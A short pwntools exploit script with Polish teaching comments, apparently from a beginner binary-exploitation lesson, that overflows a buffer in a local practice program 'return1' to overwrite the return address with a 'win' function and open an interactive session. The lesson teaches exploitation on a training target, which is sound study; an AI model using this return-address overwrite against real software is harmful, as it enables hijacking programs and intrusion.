#!/bin/python

from pwn import *

elf = ELF('./return1')

io = process('./return1')

# Znacznie lepszym sposobem na dostanie adresu funkcji
# zwycięstwa byłoby skorzystanie z funkcji ELF biblioteki pwnlib
# jednak dla uproszczenia na razie będziemy hardkodować adresy
# w późniejszych przykładach zobaczymy dlaczego
#
# biblioteki pwnlib będziemy na razie używać jedynie jako
# narzędzie pomagające w kontakcie z programem
#
# ten przykład miał jedynie pokazać, że biblioteka pwnlib
# pozwala na robienie rzeczy znacznie bardziej zaawansowanych
WIN_ADDRESS = elf.symbols['win']

io.sendline(
        b'A' * 16 +
        b'B' * 8 +
        p64(WIN_ADDRESS)
    )

io.interactive()
